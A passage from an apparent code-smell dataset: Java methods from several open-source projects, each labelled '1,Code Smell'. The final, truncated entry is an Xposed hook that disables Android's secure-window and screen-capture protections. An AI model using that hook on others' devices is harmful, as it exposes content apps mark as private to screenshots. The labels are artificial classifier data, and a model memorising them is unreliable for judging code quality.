  return this.cachedJavaMappings.computeIfAbsent(javaIdentifier,key -> {
    for (    ItemMapping mapping : this.items) {
      if (mapping.getJavaItem().javaIdentifier().equals(key)) {
        return mapping;
      }
    }
    return null;
  }
);
}
/** 
 * Gets an  {@link ItemMapping} from the given {@link ItemData}.
 * @param data the item data
 * @return an item entry from the given item data
 */
@NonNull public ItemMapping getMapping(ItemData data){
  ItemDefinition definition=data.getDefinition();
  if (ItemDefinition.AIR.equals(definition)) {
    return ItemMapping.AIR;
  }
 else   if (definition.getRuntimeId() == lodestoneCompass.getBedrockDefinition().getRuntimeId()) {
    return lodestoneCompass;
  }
  ItemMapping lightBlock=lightBlocks.get(definition.getRuntimeId());
  if (lightBlock != null) {
    return lightBlock;
  }
  boolean isBlock=data.getBlockDefinition() != null;
  boolean hasDamage=data.getDamage() != 0;
  for (  ItemMapping mapping : this.items) {
    if (mapping.getBedrockDefinition().getRuntimeId() == definition.getRuntimeId()) {
      if (isBlock && !hasDamage) {
        if (data.getBlockDefinition() != mapping.getBedrockBlockDefinition()) {
          continue;
        }
      }
 else {
        if (!(mapping.getBedrockData() == data.getDamage() || (mapping.getJavaItem().ignoreDamage() || mapping.getJavaItem() == Items.SUSPICIOUS_STEW))) {
          continue;
        }
      }
      if (!this.javaOnlyItems.contains(mapping.getJavaItem())) {
        return mapping;
      }
    }
  }
  GeyserImpl.getInstance().getLogger().debug(""Missing mapping for bedrock item "" + data);
  return ItemMapping.AIR;
}",1,Code Smell
"public void renderAll(){
  RenderSystem.disableBlend();
  FullScreenQuadRenderer.INSTANCE.begin();
  for (  Pass renderPass : passes) {
    boolean ranCompute=false;
    for (    ComputeProgram computeProgram : renderPass.computes) {
      if (computeProgram != null) {
        ranCompute=true;
        computeProgram.use();
        this.customUniforms.push(computeProgram);
        com.mojang.blaze3d.pipeline.RenderTarget main=Minecraft.getInstance().getMainRenderTarget();
        computeProgram.dispatch(main.width,main.height);
      }
    }
    if (ranCompute) {
      IrisRenderSystem.memoryBarrier(GL43C.GL_SHADER_IMAGE_ACCESS_BARRIER_BIT | GL43C.GL_TEXTURE_FETCH_BARRIER_BIT | GL43C.GL_SHADER_STORAGE_BARRIER_BIT);
    }
    Program.unbind();
    if (renderPass instanceof ComputeOnlyPass) {
      continue;
    }
    if (!renderPass.mipmappedBuffers.isEmpty()) {
      RenderSystem.activeTexture(GL15C.GL_TEXTURE0);
      for (      int index : renderPass.mipmappedBuffers) {
        setupMipmapping(renderTargets.get(index),renderPass.stageReadsFromAlt.contains(index));
      }
    }
    float scaledWidth=renderTargets.getResolution() * renderPass.viewportScale.scale();
    float scaledHeight=renderTargets.getResolution() * renderPass.viewportScale.scale();
    int beginWidth=(int)(renderTargets.getResolution() * renderPass.viewportScale.viewportX());
    int beginHeight=(int)(renderTargets.getResolution() * renderPass.viewportScale.viewportY());
    RenderSystem.viewport(beginWidth,beginHeight,(int)scaledWidth,(int)scaledHeight);
    renderPass.framebuffer.bind();
    renderPass.program.use();
    this.customUniforms.push(renderPass.program);
    FullScreenQuadRenderer.INSTANCE.renderQuad();
  }
  FullScreenQuadRenderer.INSTANCE.end();
  ProgramUniforms.clearActiveUniforms();
  GlStateManager._glUseProgram(0);
  for (int i=0; i < renderTargets.getRenderTargetCount(); i++) {
    if (renderTargets.get(i) != null) {
      resetRenderTarget(renderTargets.get(i));
    }
  }
  RenderSystem.activeTexture(GL15C.GL_TEXTURE0);
}",1,Code Smell
"private int findNumberOfDeletions(String check){
  int[] freqOfLetter;
  char[] s=check.toCharArray();
  freqOfLetter=new int[26];
  for (int i=0; i < 26; i++)   freqOfLetter[i]=0;
  for (int i=0; i < s.length; i++) {
    freqOfLetter[s[i] - 'a']++;
  }
  Map<Integer,Integer> LetterFreqMap=new TreeMap<Integer,Integer>(Collections.reverseOrder());
  for (int i=0; i < 26; i++) {
    if (freqOfLetter[i] != 0) {
      if (LetterFreqMap.containsKey(freqOfLetter[i])) {
        LetterFreqMap.put(freqOfLetter[i],LetterFreqMap.get(freqOfLetter[i]) + 1);
      }
 else       LetterFreqMap.put(freqOfLetter[i],1);
    }
  }
  int deletions=0;
  Set<Map.Entry<Integer,Integer>> set=LetterFreqMap.entrySet();
  for (  Map.Entry<Integer,Integer> me : set) {
    if (me.getKey() == 0)     break;
    while (me.getValue() > 1) {
      deletions++;
      LetterFreqMap.put(me.getKey(),LetterFreqMap.get(me.getKey()) - 1);
      if (LetterFreqMap.containsKey(me.getKey() - 1)) {
        LetterFreqMap.put(me.getKey() - 1,LetterFreqMap.get(me.getKey() - 1) + 1);
      }
 else       LetterFreqMap.put(me.getKey() - 1,1);
    }
  }
  return deletions;
}",1,Code Smell
"protected void validateWindowClause(SqlSelect select){
  final SqlNodeList windowList=select.getWindowList();
  @SuppressWarnings(""unchecked"") final List<SqlWindow> windows=(List)windowList.getList();
  if (windows.isEmpty()) {
    return;
  }
  final SelectScope windowScope=(SelectScope)getFromScope(select);
  assert windowScope != null;
  for (  SqlWindow window : windows) {
    SqlIdentifier declName=window.getDeclName();
    if (!declName.isSimple()) {
      throw newValidationError(declName,RESOURCE.windowNameMustBeSimple());
    }
    if (windowScope.existingWindowName(declName.toString())) {
      throw newValidationError(declName,RESOURCE.duplicateWindowName());
    }
 else {
      windowScope.addWindowName(declName.toString());
    }
  }
  for (int i=0; i < windows.size(); i++) {
    SqlNode window1=windows.get(i);
    for (int j=i + 1; j < windows.size(); j++) {
      SqlNode window2=windows.get(j);
      if (window1.equalsDeep(window2,Litmus.IGNORE)) {
        throw newValidationError(window2,RESOURCE.dupWindowSpec());
      }
    }
  }
  for (  SqlWindow window : windows) {
    final SqlNodeList expandedOrderList=(SqlNodeList)expand(window.getOrderList(),windowScope);
    window.setOrderList(expandedOrderList);
    expandedOrderList.validate(this,windowScope);
    final SqlNodeList expandedPartitionList=(SqlNodeList)expand(window.getPartitionList(),windowScope);
    window.setPartitionList(expandedPartitionList);
    expandedPartitionList.validate(this,windowScope);
  }
  windowList.validate(this,windowScope);
}",1,Code Smell
"public static HashSet<ReactionsLayoutInBubble.VisibleReaction> getInclusiveReactions(ArrayList<MessageObject> messages){
  LongSparseArray<ReactionsLayoutInBubble.VisibleReaction> arr=new LongSparseArray<>();
  HashSet<Long> messageReactions=new HashSet<>();
  boolean firstMessage=true;
  for (int k=0; k < messages.size(); ++k) {
    MessageObject message=messages.get(k);
    messageReactions.clear();
    if (message != null && message.messageOwner.reactions != null && message.messageOwner.reactions.results != null) {
      for (int i=0; i < message.messageOwner.reactions.results.size(); i++) {
        if (message.messageOwner.reactions.results.get(i).chosen) {
          ReactionsLayoutInBubble.VisibleReaction reaction=ReactionsLayoutInBubble.VisibleReaction.fromTLReaction(message.messageOwner.reactions.results.get(i).reaction);
          if (firstMessage || arr.indexOfKey(reaction.hash) >= 0) {
            messageReactions.add(reaction.hash);
            arr.put(reaction.hash,reaction);
          }
        }
      }
    }
    firstMessage=false;
    for (int j=0; j < arr.size(); ++j) {
      if (!messageReactions.contains(arr.keyAt(j))) {
        arr.removeAt(j);
        j--;
      }
    }
  }
  HashSet<ReactionsLayoutInBubble.VisibleReaction> selectedReactions=new HashSet<>();
  for (int j=0; j < arr.size(); ++j) {
    selectedReactions.add(arr.valueAt(j));
  }
  return selectedReactions;
}",1,Code Smell
"private void callEnded(){
  if (BuildVars.LOGS_ENABLED) {
    FileLog.d(""Call "" + getCallID() + "" ended"");
  }
  if (groupCall != null && (!playedConnectedSound || onDestroyRunnable != null)) {
    needPlayEndSound=false;
  }
  AndroidUtilities.runOnUIThread(() -> dispatchStateChanged(STATE_ENDED));
  int delay=700;
  Utilities.globalQueue.postRunnable(() -> {
    if (spPlayId != 0) {
      soundPool.stop(spPlayId);
      spPlayId=0;
    }
  }
);
  if (connectingSoundRunnable != null) {
    AndroidUtilities.cancelRunOnUIThread(connectingSoundRunnable);
    connectingSoundRunnable=null;
  }
  if (needPlayEndSound) {
    playingSound=true;
    if (groupCall == null) {
      Utilities.globalQueue.postRunnable(() -> soundPool.play(spEndId,1,1,0,0,1));
    }
 else {
      Utilities.globalQueue.postRunnable(() -> soundPool.play(spVoiceChatEndId,1.0f,1.0f,0,0,1),100);
      delay=500;
    }
    AndroidUtilities.runOnUIThread(afterSoundRunnable,delay);
  }
  if (timeoutRunnable != null) {
    AndroidUtilities.cancelRunOnUIThread(timeoutRunnable);
    timeoutRunnable=null;
  }
  endConnectionServiceCall(needPlayEndSound ? delay : 0);
  stopSelf();
}",1,Code Smell
"private boolean roundButtonTouchEvent(MotionEvent ev){
  if (ev.getAction() == MotionEvent.ACTION_DOWN) {
    if (stopRecording()) {
      return true;
    }
    recordTouch=true;
    if (getParent() != null) {
      getParent().requestDisallowInterceptTouchEvent(true);
    }
    if (!canRecord()) {
      return true;
    }
    AndroidUtilities.cancelRunOnUIThread(doneCancel);
    fromX=ev.getX();
    fromY=ev.getY();
    amplitude=0;
    slideProgress=0f;
    cancelT.set(0,true);
    cancel2T.set(0,true);
    cancelling=false;
    stopping=false;
    locked=false;
    recordPaint.reset();
    recording=true;
    startTime=System.currentTimeMillis();
    setCollapsed(true,Integer.MAX_VALUE);
    invalidateDrawOver2();
    putRecorder(currentRecorder=new RoundVideoRecorder(getContext()){
      @Override protected void receivedAmplitude(      double amplitude){
        setAmplitude(amplitude);
      }
      @Override public void stop(){
        super.stop();
        if (recording) {
          releaseRecord(true,false);
        }
      }
    }
);
    return true;
  }
 else   if (ev.getAction() == MotionEvent.ACTION_MOVE) {
    if (!cancelling) {
      slideProgress=Utilities.clamp((fromX - ev.getX()) / (getWidth() * .35f),1,0);
      lockProgress=Utilities.clamp((fromY - ev.getY()) / (getWidth() * .3f),1,0);
      if (!locked && !cancelling && slideProgress >= 1) {
        cancelling=true;
        recording=false;
        roundButton.setVisibility(INVISIBLE);
        periodButton.setVisibility(INVISIBLE);
        recordPaint.playDeleteAnimation();
        if (currentRecorder != null) {
          currentRecorder.cancel();
        }
        AndroidUtilities.runOnUIThread(doneCancel,800);
      }
 else       if (!locked && !cancelling && lockProgress >= 1 && slideProgress < .4f) {
        locked=true;
        try {
          performHapticFeedback(HapticFeedbackConstants.KEYBOARD_PRESS,HapticFeedbackConstants.FLAG_IGNORE_VIEW_SETTING);
        }
 catch (        Exception ignore) {
        }
      }
      invalidate();
      invalidateDrawOver2();
    }
  }
 else   if (ev.getAction() == MotionEvent.ACTION_UP || ev.getAction() == MotionEvent.ACTION_CANCEL) {
    if (!cancelling && !locked) {
      releaseRecord(false,false);
    }
    recordTouch=false;
  }
  return recordTouch;
}",1,Code Smell
"@Override public boolean onBackPressed(){
  Bulletin bulletin=Bulletin.getVisibleBulletin();
  if (bulletin != null && bulletin.getLayout() instanceof Bulletin.LottieLayoutWithReactions) {
    ((Bulletin.LottieLayoutWithReactions)bulletin.getLayout()).hideReactionsDialog();
    bulletin.hide();
    return false;
  }
  if (secretVoicePlayer != null && secretVoicePlayer.isShown()) {
    secretVoicePlayer.dismiss();
    return false;
  }
 else   if (closeStoryViewer()) {
    return false;
  }
 else   if (selectionReactionsOverlay != null && !selectionReactionsOverlay.onBackPressed()) {
    return false;
  }
 else   if (ContentPreviewViewer.getInstance().isVisible()) {
    ContentPreviewViewer.getInstance().closeWithMenu();
    return false;
  }
 else   if (forwardingPreviewView != null && forwardingPreviewView.isShowing()) {
    forwardingPreviewView.dismiss(true);
    return false;
  }
 else   if (messagesSearchListView.getTag() != null) {
    showMessagesSearchListView(false);
    return false;
  }
 else   if (scrimPopupWindow != null) {
    closeMenu();
    return false;
  }
 else   if (checkRecordLocked(false)) {
    return false;
  }
 else   if (textSelectionHelper.isInSelectionMode()) {
    textSelectionHelper.clear();
    return false;
  }
 else   if (actionBar != null && actionBar.isActionModeShowed()) {
    clearSelectionMode();
    return false;
  }
 else   if (chatActivityEnterView != null && chatActivityEnterView.isPopupShowing()) {
    return !chatActivityEnterView.hidePopup(true);
  }
 else   if (chatActivityEnterView != null && chatActivityEnterView.hasBotWebView() && chatActivityEnterView.botCommandsMenuIsShowing() && chatActivityEnterView.onBotWebViewBackPressed()) {
    return false;
  }
 else   if (chatActivityEnterView != null && chatActivityEnterView.botCommandsMenuIsShowing()) {
    chatActivityEnterView.hideBotCommands();
    return false;
  }
 else   if (chatActivityEnterView != null && chatActivityEnterView.closeCreationLinkDialog()) {
    return false;
  }
 else   if (chatMode == MODE_EDIT_BUSINESS_LINK && BusinessLinksActivity.closeRenameAlert()) {
    return false;
  }
  if (backToPreviousFragment != null) {
    parentLayout.addFragmentToStack(backToPreviousFragment,parentLayout.getFragmentStack().size() - 1);
    backToPreviousFragment=null;
  }
  if (instantCameraView != null) {
    instantCameraView.cancel(false);
  }
  if (chatMode == MODE_QUICK_REPLIES && !(QuickRepliesController.GREETING.equalsIgnoreCase(quickReplyShortcut) || QuickRepliesController.AWAY.equalsIgnoreCase(quickReplyShortcut)) && (messages.isEmpty() || threadMessageId == 0)) {
    showQuickRepliesRemoveAlert();
    return false;
  }
  if (chatMode == MODE_EDIT_BUSINESS_LINK && chatActivityEnterView.businessLinkHasChanges()) {
    showBusinessLinksDiscardAlert(() -> {
      finishFragment();
    }
);
    return false;
  }
  return true;
}",1,Code Smell
"public void open(){
  if (!this.disposed.get()) {
    LOG.debug(""Opening webcam device {}"",this.getName());
    if (this.size == null) {
      this.size=this.getResolutions()[0];
    }
    if (this.size == null) {
      throw new RuntimeException(""The resolution size cannot be null"");
    }
 else {
      LOG.debug(""Webcam device {} starting session, size {}"",this.device.getIdentifierStr(),this.size);
      this.grabber=new OpenIMAJGrabber();
      DeviceList list=(DeviceList)this.grabber.getVideoDevices().get();
      Iterator var2=list.asArrayList().iterator();
      while (var2.hasNext()) {
        Device d=(Device)var2.next();
        d.getNameStr();
        d.getIdentifierStr();
      }
      boolean started=this.grabber.startSession(this.size.width,this.size.height,50,Pointer.pointerTo(this.device));
      if (!started) {
        throw new WebcamException(""Cannot start native grabber!"");
      }
 else {
        this.grabber.setTimeout(this.timeout);
        LOG.debug(""Webcam device session started"");
        Dimension size2=new Dimension(this.grabber.getWidth(),this.grabber.getHeight());
        int w1=this.size.width;
        int w2=size2.width;
        int h1=this.size.height;
        int h2=size2.height;
        if (w1 != w2 || h1 != h2) {
          if (this.failOnSizeMismatch) {
            throw new WebcamException(String.format(""Different size obtained vs requested - [%dx%d] vs [%dx%d]"",w1,h1,w2,h2));
          }
          Object[] args=new Object[]{w1,h1,w2,h2,w2,h2};
          LOG.warn(""Different size obtained vs requested - [{}x{}] vs [{}x{}]. Setting correct one. New size is [{}x{}]"",args);
          this.size=new Dimension(w2,h2);
        }
        this.smodel=new ComponentSampleModel(0,this.size.width,this.size.height,3,this.size.width * 3,BAND_OFFSETS);
        this.cmodel=new ComponentColorModel(COLOR_SPACE,BITS,false,false,1,0);
        LOG.debug(""Clear memory buffer"");
        this.clearMemoryBuffer();
        LOG.debug(""Webcam device {} is now open"",this);
        this.open.set(true);
        this.refresher=this.startFramesRefresher();
      }
    }
  }
}",1,Code Smell
"protected Context onGetSceneContext(){
  if (this.mActivity == null) {
    throw new IllegalStateException(""onGetContextThemeWrapper() cannot be executed until the "" + ""Scene is attached to the Activity."");
  }
  if (this.mThemeResource > 0) {
    return new SceneContextThemeWrapper(this.mActivity,this.mThemeResource){
      @Override public Object getSystemService(      @NonNull String name){
        if (SCENE_SERVICE.equals(name)) {
          return Scene.this;
        }
 else         if (Context.LAYOUT_INFLATER_SERVICE.equals(name)) {
          if (getActivity() != null) {
            return getLayoutInflater();
          }
        }
        return super.getSystemService(name);
      }
    }
;
  }
 else {
    return new SceneContextThemeWrapper(this.mActivity,this.mActivity.getTheme()){
      @Override public Object getSystemService(      @NonNull String name){
        if (SCENE_SERVICE.equals(name)) {
          return Scene.this;
        }
 else         if (Context.LAYOUT_INFLATER_SERVICE.equals(name)) {
          if (getActivity() != null) {
            return getLayoutInflater();
          }
        }
        return super.getSystemService(name);
      }
    }
;
  }
}",1,Code Smell
"public Type resolveSlashed(String slashedTypeName){
  return resolveSlashed(slashedTypeName,false);
}
public Type resolveSlashed(String slashedTypeName,boolean allowNotFound){
  Type resolvedType=typeCache.get(slashedTypeName);
  if (resolvedType == Type.MISSING) {
    if (allowNotFound) {
      return null;
    }
 else {
      throw new MissingTypeException(slashedTypeName);
    }
  }
  if (resolvedType != null) {
    return resolvedType;
  }
  resolvedType=findType(slashedTypeName);
  if (resolvedType == null) {
    String current=slashedTypeName;
    int lastSlash=current.lastIndexOf(""/"");
    while (lastSlash != -1 && (lastSlash + 1) < current.length()) {
      String attempt=current.substring(0,lastSlash) + ""$"" + current.substring(lastSlash + 1);
      resolvedType=findType(attempt);
      if (resolvedType != null) {
        break;
      }
      current=attempt;
      lastSlash=current.lastIndexOf(""/"");
    }
  }
  if (resolvedType != null) {
    typeCache.put(slashedTypeName,resolvedType);
    return resolvedType;
  }
 else {
    typeCache.put(slashedTypeName,Type.MISSING);
    if (allowNotFound) {
      return null;
    }
 else {
      throw new MissingTypeException(slashedTypeName);
    }
  }
}",1,Code Smell
"public Type parse(JsonNode typeJson){
  try {
    if (typeJson.has(""oneOf"")) {
      return new OneOfType(parseChildren(typeJson.get(""oneOf"")));
    }
 else     if (typeJson.has(""allOf"")) {
      return new AllOfType(parseChildren(typeJson.get(""allOf"")));
    }
 else     if (typeJson.has(""anyOf"")) {
      return new AnyOfType(parseChildren(typeJson.get(""anyOf"")));
    }
 else     if (typeJson.has(""$ref"")) {
      String pointer=typeJson.get(""$ref"").asText();
      return new RefType(pointer);
    }
 else     if (typeJson.has(""type"")) {
      String typeName=typeJson.get(""type"").asText();
      if (typeName.equals(""string"") && typeJson.has(""enum"")) {
        Iterator<JsonNode> valuesIterator=typeJson.get(""enum"").elements();
        Iterable<JsonNode> valuesIterable=() -> valuesIterator;
        List<String> values=StreamSupport.stream(valuesIterable.spliterator(),false).map(jsonNode -> jsonNode.asText()).collect(Collectors.toList());
        return new EnumType(values);
      }
 else       if (typeName.equals(""string"") || typeName.equals(""integer"") || typeName.equals(""number"")|| typeName.equals(""boolean"")) {
        return new PrimitiveType(typeName,typeJson.has(""format"") ? typeJson.get(""format"").asText() : null);
      }
 else       if (typeName.equals(""object"") && (typeJson.has(""properties"") || typeJson.has(""additionalProperties"") || typeJson.has(""patternProperties""))) {
        List<Field> fields=new ArrayList<Field>();
        boolean hasAdditionalProperties=false;
        Type additionalPropertiesType=null;
        if (typeJson.has(""properties"")) {
          JsonNode properties=typeJson.get(""properties"");
          for (Iterator<Entry<String,JsonNode>> fieldsJson=properties.fields(); fieldsJson.hasNext(); ) {
            Entry<String,JsonNode> field=fieldsJson.next();
            Type fieldType=parse(field.getValue());
            String description=field.getValue().has(""description"") ? field.getValue().get(""description"").asText() : null;
            fields.add(new Field(field.getKey(),fieldType,description));
          }
        }
        if (typeJson.has(""additionalProperties"")) {
          hasAdditionalProperties=true;
          JsonNode additionalProperties=typeJson.get(""additionalProperties"");
          if (additionalProperties.isObject()) {
            additionalPropertiesType=parse(additionalProperties);
          }
        }
 else         if (typeJson.has(""patternProperties"")) {
          hasAdditionalProperties=true;
          JsonNode patternProperties=typeJson.get(""patternProperties"");
          if (patternProperties.isObject()) {
            Iterator<Entry<String,JsonNode>> patternFields=patternProperties.fields();
            Entry<String,JsonNode> patternField=patternFields.hasNext() ? patternFields.next() : null;
            if (patternField == null || patternFields.hasNext() || !patternField.getValue().isObject()) {
              throw new RuntimeException(""can't parse type "" + patternProperties);
            }
            additionalPropertiesType=parse(patternField.getValue());
          }
        }
        return new ObjectType(fields,hasAdditionalProperties,additionalPropertiesType);
      }
 else       if (typeName.equals(""array"")) {
        Type itemsType=parse(typeJson.get(""items""));
        return new ArrayType(itemsType);
      }
    }
  }
 catch (  RuntimeException e) {
    throw new RuntimeException(""can't parse type "" + typeJson,e);
  }
  throw new RuntimeException(""Invalid schema, unknown type: "" + typeJson);
}
",1,Code Smell
"public void setException(NotificationsSettingsActivity.NotificationException exception,CharSequence name,boolean divider){
  String text;
  boolean enabled;
  boolean custom=exception.hasCustom;
  int value=exception.notify;
  int delta=exception.muteUntil;
  if (value == 3 && delta != Integer.MAX_VALUE) {
    delta-=ConnectionsManager.getInstance(currentAccount).getCurrentTime();
    if (delta <= 0) {
      if (custom) {
        text=LocaleController.getString(""NotificationsCustom"",R.string.NotificationsCustom);
      }
 else {
        text=LocaleController.getString(""NotificationsUnmuted"",R.string.NotificationsUnmuted);
      }
    }
 else     if (delta < 60 * 60) {
      text=LocaleController.formatString(""WillUnmuteIn"",R.string.WillUnmuteIn,LocaleController.formatPluralString(""Minutes"",delta / 60));
    }
 else     if (delta < 60 * 60 * 24) {
      text=LocaleController.formatString(""WillUnmuteIn"",R.string.WillUnmuteIn,LocaleController.formatPluralString(""Hours"",(int)Math.ceil(delta / 60.0f / 60)));
    }
 else     if (delta < 60 * 60 * 24* 365) {
      text=LocaleController.formatString(""WillUnmuteIn"",R.string.WillUnmuteIn,LocaleController.formatPluralString(""Days"",(int)Math.ceil(delta / 60.0f / 60/ 24)));
    }
 else {
      text=null;
    }
  }
 else {
    if (value == 0) {
      enabled=true;
    }
 else     if (value == 1) {
      enabled=true;
    }
 else     if (value == 2) {
      enabled=false;
    }
 else {
      enabled=false;
    }
    if (enabled && custom) {
      text=LocaleController.getString(""NotificationsCustom"",R.string.NotificationsCustom);
    }
 else {
      text=enabled ? LocaleController.getString(""NotificationsUnmuted"",R.string.NotificationsUnmuted) : LocaleController.getString(""NotificationsMuted"",R.string.NotificationsMuted);
    }
  }
  if (text == null) {
    text=LocaleController.getString(""NotificationsOff"",R.string.NotificationsOff);
  }
  if (DialogObject.isEncryptedDialog(exception.did)) {
    TLRPC.EncryptedChat encryptedChat=MessagesController.getInstance(currentAccount).getEncryptedChat(DialogObject.getEncryptedChatId(exception.did));
    if (encryptedChat != null) {
      TLRPC.User user=MessagesController.getInstance(currentAccount).getUser(encryptedChat.user_id);
      if (user != null) {
        setData(user,encryptedChat,name,text,0,false);
      }
    }
  }
 else   if (DialogObject.isUserDialog(exception.did)) {
    TLRPC.User user=MessagesController.getInstance(currentAccount).getUser(exception.did);
    if (user != null) {
      setData(user,null,name,text,0,divider);
    }
  }
 else {
    TLRPC.Chat chat=MessagesController.getInstance(currentAccount).getChat(-exception.did);
    if (chat != null) {
      setData(chat,null,name,text,0,divider);
    }
  }
}",1,Code Smell
"private void setDataCategory(Long moduleId,AtomicInteger page,List<CustomCategory> categories,Map<Long,List<CustomCategoryRule>> rulesGroupByCategoryId,List<ModuleField> moduleFields){
  SearchBO searchBO=new SearchBO();
  searchBO.setPage(page.getAndIncrement());
  searchBO.setLimit(2000);
  searchBO.setModuleId(moduleId);
  searchBO.setAuthFilter(false);
  BasePage<Map<String,Object>> data=queryPageList(searchBO,moduleId);
  CustomCategory defaultCategory=categories.stream().filter(c -> ObjectUtil.equal(0,c.getType())).findFirst().orElse(null);
  if (ObjectUtil.isNull(defaultCategory)) {
    return;
  }
  Set<Long> dataIds=new HashSet<>();
  for (  CustomCategory category : categories) {
    List<CustomCategoryRule> rules=rulesGroupByCategoryId.get(category.getCategoryId());
    if (CollUtil.isEmpty(rules)) {
      continue;
    }
    for (    CustomCategoryRule rule : rules) {
      ModuleFormulaBO formulaBO=JSON.parseObject(rule.getFormula(),ModuleFormulaBO.class);
      for (      Map<String,Object> map : data.getList()) {
        Long dataId=MapUtil.getLong(map,""dataId"");
        Long categoryId=MapUtil.getLong(map,""categoryId"");
        if (CollUtil.contains(dataIds,dataId)) {
          continue;
        }
        if (ObjectUtil.equal(defaultCategory.getCategoryId(),rule.getFrom())) {
          if (ObjectUtil.isNotNull(categoryId)) {
            continue;
          }
        }
 else {
          if (ObjectUtil.notEqual(rule.getFrom(),categoryId)) {
            continue;
          }
        }
        Map<String,Object> env=buildFormulaEnv(moduleFields,map);
        formulaBO.setEnv(env);
        try {
          if (ObjectUtil.equal(AviatorBoolean.TRUE,ExpressionUtil.execute(formulaBO)) || ObjectUtil.equal(true,ExpressionUtil.execute(formulaBO))) {
            dataIds.add(dataId);
            ModuleFieldDataCommon dataCommon=fieldDataCommonService.getByDataId(dataId);
            if (ObjectUtil.equal(defaultCategory.getCategoryId(),rule.getTo())) {
              dataCommon.setCategoryId(null);
            }
 else {
              dataCommon.setCategoryId(rule.getTo());
            }
            dataCommon.setUpdateTime(DateUtil.date());
            fieldDataCommonService.updateById(dataCommon);
            Map<String,Object> fieldValueMap=new HashMap<>(1);
            fieldValueMap.put(""categoryId"",dataCommon.getCategoryId());
            fieldValueMap.put(""updateTime"",DateUtil.formatDateTime(dataCommon.getUpdateTime()));
            updateField(fieldValueMap,dataId,moduleId);
          }
        }
 catch (        Exception e) {
          continue;
        }
      }
    }
  }
  if (page.get() < data.getPages()) {
    setDataCategory(moduleId,page,categories,rulesGroupByCategoryId,moduleFields);
  }
}",1,Code Smell
"/** 
 * Deserialization factory.
 * @param version The serialized object version.
 * @param className The class name.
 * @param message The serialized data.
 * @throws InvalidProtocolBufferException If the protobuf could not be parsed from the {@code message}.
 * @return The deserialized object.
 */
public static DenseSparseMatrix deserializeFromProto(int version,String className,Any message) throws InvalidProtocolBufferException {
  if (version < 0 || version > CURRENT_VERSION) {
    throw new IllegalArgumentException(""Unknown version "" + version + "", this class supports at most version ""+ CURRENT_VERSION);
  }
  SparseTensorProto proto=message.unpack(SparseTensorProto.class);
  List<Integer> shapeList=proto.getDimensionsList();
  int[] shape=Util.toPrimitiveInt(shapeList);
  if (shape.length != 2) {
    throw new IllegalArgumentException(""Invalid proto, expected a vector, found shape "" + Arrays.toString(shape));
  }
  for (int i=0; i < shape.length; i++) {
    if (shape[i] < 1) {
      throw new IllegalArgumentException(""Invalid proto, shape must be positive, found "" + shape[i] + "" at position ""+ i);
    }
  }
  int numElements=proto.getNumNonZero();
  IntBuffer indicesBuffer=proto.getIndices().asReadOnlyByteBuffer().order(ByteOrder.LITTLE_ENDIAN).asIntBuffer();
  if (indicesBuffer.remaining() != numElements * 2) {
    throw new IllegalArgumentException(""Invalid proto, claimed "" + (numElements * 2) + "", but only had ""+ indicesBuffer.remaining()+ "" indices"");
  }
  DoubleBuffer valuesBuffer=proto.getValues().asReadOnlyByteBuffer().order(ByteOrder.LITTLE_ENDIAN).asDoubleBuffer();
  if (valuesBuffer.remaining() != numElements) {
    throw new IllegalArgumentException(""Invalid proto, claimed "" + numElements + "", but only had ""+ valuesBuffer.remaining()+ "" values"");
  }
  SparseVector[] vectors=new SparseVector[shape[0]];
  List<Integer> indices=new ArrayList<>();
  List<Double> values=new ArrayList<>();
  int rowCounter=0;
  for (int i=0; i < numElements; i++) {
    int curI=indicesBuffer.get();
    int curJ=indicesBuffer.get();
    double curValue=valuesBuffer.get();
    while (curI != rowCounter) {
      vectors[rowCounter]=SparseVector.createAndValidate(shape[1],Util.toPrimitiveInt(indices),Util.toPrimitiveDouble(values));
      indices.clear();
      values.clear();
      rowCounter++;
    }
    indices.add(curJ);
    values.add(curValue);
  }
  vectors[rowCounter]=SparseVector.createAndValidate(shape[1],Util.toPrimitiveInt(indices),Util.toPrimitiveDouble(values));
  indices.clear();
  values.clear();
  rowCounter++;
  while (rowCounter < shape[0]) {
    vectors[rowCounter]=new SparseVector(shape[1],new int[0],new double[0]);
    rowCounter++;
  }
  return new DenseSparseMatrix(vectors);
}",1,Code Smell
"@Override public void init(){
  if (lpparam.packageName.equals(""android"")) {
    try {
      Class<?> windowsState=XposedHelpers.findClass(""com.android.server.wm.WindowState"",lpparam.classLoader);
      Class<?> windowsManagerServiceImpl=XposedHelpers.findClassIfExists(""com.android.server.wm.WindowManagerServiceImpl"",lpparam.classLoader);
      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
        XposedHelpers.findAndHookMethod(windowsState,""isSecureLocked"",XC_MethodReplacement.returnConstant(false));
      }
 else {
        XposedHelpers.findAndHookMethod(""com.android.server.wm.WindowManagerService"",lpparam.classLoader,""isSecureLocked"",windowsState,XC_MethodReplacement.returnConstant(false));
      }
      hookAllMethods(windowsManagerServiceImpl,""notAllowCaptureDisplay"",new MethodHook(){
        @Override protected void before(        MethodHookParam param) throws Throwable {
          param.setResult(false);
        }
      }
);
    }
 catch (    Throwable t) {
      logE(TAG,this.lpparam.packageName,t);
    }
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
      try {
        XposedHelpers.findAndHookMethod(""com.android.server.wm.ActivityTaskManagerService"",lpparam.classLoader,""registerScreenCaptureObserver"",""android.os.IBinder"",""android.app.IScreenCaptureObserver"",XC_MethodReplacement.DO_NOTHING);
      }
 catch (      Throwable t) {
        logE(TAG,this.lpparam.packageName,t);
      }
    }
    try {
      deoptimizeMethod(XposedHelpers.findClass(""com.android.server.wm.WindowStateAnimator"",lpparam.classLoader),""createSurfaceLocked"");
      var c=XposedHelpers.findClass(""com.android.server.display.DisplayManagerService"",lpparam.classLoader);
      deoptimizeMethod(c,""setUserPreferredModeForDisplayLocked"");
      deoptimizeMethod(c,""setUserPreferredDisplayModeInternal"");
      c=XposedHelpers.findClass(""com.android.server.wm.InsetsPolicy$InsetsPolicyAnimationControlListener"",lpparam.classLoader);
      for (      var m : c.getDeclaredConstructors()) {
        deoptimizeMethod.invoke(null,m);
      }
      c=XposedHelpers.findClass(""com.android.server.wm.InsetsPolicy"",lpparam.classLoader);
      deoptimizeMethod(c,""startAnimation"");
      deoptimizeMethod(c,""controlAnimationUnchecked"");
      for (int i=0; i < 20; i++) {
        c=XposedHelpers.findClassIfExists(""com.android.server.wm.DisplayContent$$ExternalSyntheticLambda"" + i,lpparam.classLoader);
        if (c != null && BiPredicate.class.isAssignableFrom(c)) {
